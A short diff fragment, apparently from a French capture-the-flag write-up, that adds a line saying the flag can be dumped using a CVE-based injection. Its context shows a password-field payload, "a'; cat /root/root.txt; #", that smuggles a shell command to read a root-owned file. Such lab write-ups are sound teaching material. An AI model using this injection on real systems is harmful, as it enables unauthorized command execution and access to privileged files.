@@ -322,3 +322,5 @@ On peut lire dans la CVE que le champs de password n'est pas suffisament protég
 ```
 a'; cat /root/root.txt; #
 ```
+
+dedans, on peut dump le flag
